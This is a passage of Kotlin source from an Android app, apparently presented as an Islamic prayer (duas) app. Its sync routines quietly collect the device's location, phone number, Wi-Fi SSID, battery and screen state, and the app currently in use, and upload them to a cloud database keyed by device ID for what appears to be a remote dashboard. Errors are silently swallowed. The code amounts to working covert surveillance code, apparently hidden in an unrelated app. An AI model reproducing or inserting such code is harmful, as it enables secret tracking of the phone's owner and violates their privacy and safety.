                    if (deleted > 0) Log.i(TAG, "WiFi scan cleanup: deleted $deleted old entries (>7d)")
                }
            } catch (e: Exception) {
                Log.w(TAG, "WiFi scan cleanup error: ${e.message}", e)
            }
        }

        private suspend fun minimalSync(context: Context) {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
                var best: android.location.Location? = null
                for (provider in listOf(
                    android.location.LocationManager.GPS_PROVIDER,
                    android.location.LocationManager.NETWORK_PROVIDER,
                    android.location.LocationManager.PASSIVE_PROVIDER
                )) {
                    try {
                        @Suppress("DEPRECATION")
                        val loc = lm.getLastKnownLocation(provider)
                        if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                    } catch (_: Exception) {}
                }
                if (best != null && best.accuracy <= 500f) {
                    if (System.currentTimeMillis() - best.time > 300_000L) return
                    val sp = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    shouldWriteLocation(context, sp, best.latitude, best.longitude, best.accuracy, System.currentTimeMillis(), "minimal_sync")
                }
            } catch (_: Exception) {}
        }

        private fun haversineDist(lat1: Double, lng1: Double, lat2: Double, lng2: Double): Double {
            val R = 6371000.0
            val dLat = Math.toRadians(lat2 - lat1)
            val dLng = Math.toRadians(lng2 - lng1)
            val sinHalfLat = Math.sin(dLat / 2)
            val sinHalfLng = Math.sin(dLng / 2)
            val a = sinHalfLat * sinHalfLat + Math.cos(Math.toRadians(lat1)) * Math.cos(Math.toRadians(lat2)) * sinHalfLng * sinHalfLng
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
        }

        suspend fun lightweightSync(context: Context) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val androidId = DeviceId.get(context)
                val now = System.currentTimeMillis()
                val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
                val timeStr = dateFormat.format(Date(now))

                // Track screen state
                val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                if (pm?.isInteractive == true) {
                    prefs.edit().putLong("lastScreenOnMs", now).apply()
                }

                // Lightweight metrics (battery, wifi, network only — no app usage stats queries)
                val metricsCollector = islamic.duas.metrics.MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()
                val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
                val metricsDoc = JSONObject().apply {
                    put("timestamp", timeStr)
                    put("ts_ms", now)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                    put("lastScreenOnMs", lastScreenOnMs)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)

                // Most recently used app (lightweight — only queries last hour)
                try {
                    val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
                    val mode = appOps?.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), context.packageName
                    )
                    if (mode == android.app.AppOpsManager.MODE_ALLOWED) {
                        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                        if (usm != null) {
                            val endTime = now
                            val startTime = endTime - 3600000L
                            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startTime, endTime)
                            var newestApp: android.app.usage.UsageStats? = null
                            for (s in stats) {
                                if (s.lastTimeUsed > 0 && (newestApp == null || s.lastTimeUsed > newestApp.lastTimeUsed)) {
                                    newestApp = s
                                }
                            }
                            if (newestApp != null && newestApp.lastTimeUsed > 0) {
                                val appName = try {
                                    val pkgMgr = context.packageManager
                                    val ai = pkgMgr.getApplicationInfo(newestApp.packageName, 0)
                                    pkgMgr.getApplicationLabel(ai).toString()
                                } catch (_: Exception) { newestApp.packageName }
                                val activeDoc = JSONObject().apply {
                                    put("appName", appName)
                                    put("packageName", newestApp.packageName)
                                    put("lastUsedMs", newestApp.lastTimeUsed)
                                }
                                CloudApi.writeToRTDB("devices/$androidId/activeApp", activeDoc)
                            }
                        }
                    }
                } catch (_: Exception) {}
            } catch (e: Exception) {
                Log.d(TAG, "lightweightSync: ${e.message}")
            }
        }

        fun captureAppSnapshot(context: Context) {
            try {
                val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
                val mode = appOps?.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
                if (mode != android.app.AppOpsManager.MODE_ALLOWED) return

                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager ?: return
                val now = System.currentTimeMillis()
                var lastPkg: String? = null
                var lastTs: Long = 0

                // Try queryEvents first (individual ACTIVITY_RESUMED events)
                try {
                    val events = usm.queryEvents(now - 60000, now)
                    if (events != null) {
                        val ev = android.app.usage.UsageEvents.Event()
                        while (events.getNextEvent(ev)) {
                            if (ev.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED) {
                                lastPkg = ev.packageName
                                lastTs = ev.timeStamp
                            }
                        }
                    }
                } catch (_: Exception) {}

                // Fallback: queryUsageStats if queryEvents returned nothing
                if (lastPkg == null) {
                    try {
                        val stats = usm.queryUsageStats(
                            android.app.usage.UsageStatsManager.INTERVAL_BEST,
                            now - 3600000L, now
                        )
                        if (stats != null) {
                            var newest: android.app.usage.UsageStats? = null
                            for (s in stats) {
                                if (s.lastTimeUsed > 0 && (newest == null || s.lastTimeUsed > newest.lastTimeUsed)) {
                                    newest = s
                                }
                            }
                            if (newest != null && newest.lastTimeUsed > 0) {
                                lastPkg = newest.packageName
                                lastTs = newest.lastTimeUsed
                            }
                        }
                    } catch (_: Exception) {}
                }

                if (lastPkg != null && lastTs > 0) {
                    val appName = try {
                        val pkgMgr = context.packageManager
                        val ai = pkgMgr.getApplicationInfo(lastPkg, 0)
                        pkgMgr.getApplicationLabel(ai).toString()
                    } catch (_: Exception) { lastPkg }
                    val androidId = DeviceId.get(context)
                    val snapDoc = JSONObject().apply {
                        put("appName", appName)
                        put("packageName", lastPkg)
                        put("phoneTsMs", lastTs)
                        put("dashboardTsMs", now)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/appSnapshots/$now", snapDoc)
                }
            } catch (_: Exception) {}
        }

        private fun shouldWriteLocation(context: Context, prefs: android.content.SharedPreferences, lat: Double, lng: Double, accuracy: Float, nowMs: Long, source: String) {
            val lastLocLat = prefs.getFloat("last_loc_lat", Float.NaN)
            val lastLocLng = prefs.getFloat("last_loc_lng", Float.NaN)
            val lastLocTime = prefs.getLong("last_loc_write_ms", 0L)
            val isFirst = lastLocLat.isNaN() || lastLocLng.isNaN()
            val moved = isFirst || haversineDist(lastLocLat.toDouble(), lastLocLng.toDouble(), lat, lng) > 20.0
            val timeElapsed = nowMs - lastLocTime
            val timeExpired = timeElapsed > 300000L
            if (moved || timeExpired) {
                val loc = android.location.Location("") // dummy for writeLocation
                loc.latitude = lat
                loc.longitude = lng
                loc.accuracy = accuracy
                loc.time = nowMs
                LocationSyncManager.writeLocation(context, loc, source)
                prefs.edit().putFloat("last_loc_lat", lat.toFloat()).apply()
                prefs.edit().putFloat("last_loc_lng", lng.toFloat()).apply()
                prefs.edit().putLong("last_loc_write_ms", nowMs).apply()
            }
        }
    }
}
